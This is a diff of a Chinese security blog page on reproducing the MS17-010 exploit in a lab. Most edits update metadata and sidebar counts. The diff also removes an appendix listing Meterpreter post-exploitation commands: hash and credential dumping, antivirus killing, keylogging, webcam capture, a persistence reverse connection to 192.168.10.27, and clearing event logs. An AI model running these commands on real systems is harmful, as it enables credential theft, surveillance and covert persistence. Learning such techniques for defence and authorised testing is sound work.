@@ -45,7 +45,7 @@
         content="2021-06-28">
       <meta 
         property="og:article:modified_time" 
-        content="2021-08-09">
+        content="2021-08-26">
       <meta 
         property="og:article:author" 
         content="沉墨">
@@ -289,7 +289,7 @@
     
     
       <span class="dot"></span>
-      <span>1k 字</span>
+      <span>475 字</span>
     
   </div>
   
@@ -363,8 +363,6 @@
 <p>b、成功连接至靶机</p>
 <p> <img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161839547.png" alt="image-20210809161839547" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161839547.png" class="lozad post-image"></p>
 <p>至此，本次利用结束。后文附上meterpreter的其他指令，不做演示。</p>
-<p>附录</p>
-<pre class="highlight"><span class="line">sysinfo             #查看目标主机系统信息</span><br><span class="line">run scraper         #查看目标主机详细信息</span><br><span class="line">run hashdump        #导出密码的哈希</span><br><span class="line">load kiwi           #加载</span><br><span class="line">ps                  #查看目标主机进程信息</span><br><span class="line">pwd                 #查看目标当前目录(windows)</span><br><span class="line">getlwd              #查看目标当前目录(Linux)</span><br><span class="line">search -f *.jsp -d e:\                #搜索E盘中所有以.jsp为后缀的文件</span><br><span class="line">download  e:\test.txt  /root          #将目标机的e:\test.txt文件下载到/root目录下</span><br><span class="line">upload    /root/test.txt d:\test      #将/root/test.txt上传到目标机的 d:\test\ 目录下</span><br><span class="line">getpid              #查看当前Meterpreter Shell的进程</span><br><span class="line">PIDmigrate 1384     #将当前Meterpreter Shell的进程迁移到PID为1384的进程上</span><br><span class="line">idletime            #查看主机运行时间</span><br><span class="line">getuid              #查看获取的当前权限</span><br><span class="line">getsystem           #提权</span><br><span class="line">run  killav         #关闭杀毒软件</span><br><span class="line">screenshot          #截图</span><br><span class="line">webcam_list         #查看目标主机的摄像头</span><br><span class="line">webcam_snap         #拍照</span><br><span class="line">webcam_stream       #开视频</span><br><span class="line">execute  参数  -f 可执行文件   #执行可执行程序</span><br><span class="line">run getgui -u hack -p 123    #创建hack用户，密码为123</span><br><span class="line">run getgui -e                #开启远程桌面</span><br><span class="line">keyscan_start                #开启键盘记录功能</span><br><span class="line">keyscan_dump                 #显示捕捉到的键盘记录信息</span><br><span class="line">keyscan_stop                 #停止键盘记录功能</span><br><span class="line">uictl  disable  keyboard     #禁止目标使用键盘</span><br><span class="line">uictl  enable   keyboard     #允许目标使用键盘</span><br><span class="line">uictl  disable  mouse        #禁止目标使用鼠标</span><br><span class="line">uictl  enable   mouse        #允许目标使用鼠标</span><br><span class="line">load                         #使用扩展库</span><br><span class="line">run                          #使用扩展库</span><br><span class="line">run persistence -X -i 5 -p 8888 -r 192.168.10.27        #反弹时间间隔是5s 会自动连接192.168.27的4444端口，缺点是容易被杀毒软件查杀</span><br><span class="line">portfwd add -l 3389 -r 192.168.11.13 -p 3389            #将192.168.11.13的3389端口转发到本地的3389端口上，这里的192.168.11.13是获取权限的主机的ip地址</span><br><span class="line"></span><br><span class="line">clearev                       							#清除日志</span><br><span class="line"></span><br><span class="line">run post/windows/manage/migrate                  #自动进程迁移     </span><br><span class="line">run post/windows/gather/checkvm                  #查看目标主机是否运行在虚拟机上     </span><br><span class="line">run post/windows/manage/killav                   #关闭杀毒软件     </span><br><span class="line">run post/windows/manage/enable_rdp               #开启远程桌面服务     </span><br><span class="line">run post/windows/manage/autoroute                #查看路由信息     </span><br><span class="line">run post/windows/gather/enum_logged_on_users     #列举当前登录的用户     </span><br><span class="line">run post/windows/gather/enum_applications        #列举应用程序     </span><br><span class="line">run windows/gather/credentials/windows_autologin #抓取自动登录的用户名和密码     </span><br><span class="line">run windows/gather/smart_hashdump                #dump出所有用户的hash</span><br></pre>
 
   </div>
   <div>
@@ -488,19 +486,19 @@
   <a 
     class="author-posts-count" 
     href="/archives">
-    <span>46</span>
+    <span>47</span>
     <span>文章</span>
   </a>
   <a 
     class="author-categories-count" 
     href="/categories">
-    <span>10</span>
+    <span>11</span>
     <span>分类</span>
   </a>
   <a 
     class="author-tags-count" 
     href="/tags">
-    <span>46</span>
+    <span>47</span>
     <span>标签</span>
   </a>
 </div>
@@ -553,13 +551,6 @@
         </div>
       </a>
     
-      <a href="/categories/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/">
-        <div class="categories-list-item">
-          网络基础
-          <span class="categories-list-item-badge">2</span>
-        </div>
-      </a>
-    
       <a href="/categories/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">
         <div class="categories-list-item">
           环境搭建
@@ -567,9 +558,23 @@
         </div>
       </a>
     
+      <a href="/categories/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/">
+        <div class="categories-list-item">
+          网络基础
+          <span class="categories-list-item-badge">2</span>
+        </div>
+      </a>
+    
       <a href="/categories/Linux/">
         <div class="categories-list-item">
           Linux
+          <span class="categories-list-item-badge">1</span>
+        </div>
+      </a>
+    
+      <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">
+        <div class="categories-list-item">
+          内网渗透
           <span class="categories-list-item-badge">1</span>
         </div>
       </a>
@@ -647,21 +652,15 @@
       </a>
     
       <a 
-        href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" 
-        title="文件上传">
-        <div class="tags-list-item">文件上传</div>
-      </a>
-    
-      <a 
         href="/tags/%E7%BB%BC%E5%90%88%E9%9D%B6%E5%9C%BA/" 
         title="综合靶场">
         <div class="tags-list-item">综合靶场</div>
       </a>
     
       <a 
-        href="/tags/%E5%8D%9A%E5%AE%A2/" 
-        title="博客">
-        <div class="tags-list-item">博客</div>
+        href="/tags/Apache/" 
+        title="Apache">
+        <div class="tags-list-item">Apache</div>
       </a>
     
       <a 
@@ -677,9 +676,15 @@
       </a>
     
       <a 
-        href="/tags/Apache/" 
-        title="Apache">
-        <div class="tags-list-item">Apache</div>
+        href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" 
+        title="文件上传">
+        <div class="tags-list-item">文件上传</div>
+      </a>
+    
+      <a 
+        href="/tags/%E5%8D%9A%E5%AE%A2/" 
+        title="博客">
+        <div class="tags-list-item">博客</div>
       </a>
     
       <a 
@@ -695,15 +700,15 @@
       </a>
     
       <a 
-        href="/tags/%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/" 
-        title="入侵排查">
-        <div class="tags-list-item">入侵排查</div>
-      </a>
-    
-      <a 
         href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" 
         title="信息收集">
         <div class="tags-list-item">信息收集</div>
+      </a>
+    
+      <a 
+        href="/tags/%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/" 
+        title="入侵排查">
+        <div class="tags-list-item">入侵排查</div>
       </a>
     
       <a 
@@ -745,6 +750,11 @@
   <div class="recent-posts-list">
     
       <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2021-08-26</div>
+        <a href="/article/MSF%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"><div class="recent-posts-item-content">MSF常用命令</div></a>
+      </div>
+    
+      <div class="recent-posts-item">
         <div class="recent-posts-item-title">2021-08-22</div>
         <a href="/article/%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/"><div class="recent-posts-item-content">入侵排查</div></a>
       </div>
@@ -757,11 +767,6 @@
       <div class="recent-posts-item">
         <div class="recent-posts-item-title">2021-08-15</div>
         <a href="/article/Python%E4%B9%8B%E7%88%86%E7%A0%B4%E8%84%9A%E6%9C%AC/"><div class="recent-posts-item-content">Python之爆破脚本</div></a>
-      </div>
-    
-      <div class="recent-posts-item">
-        <div class="recent-posts-item-title">2021-08-06</div>
-        <a href="/article/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"><div class="recent-posts-item-content">信息收集</div></a>
       </div>
     
   </div>
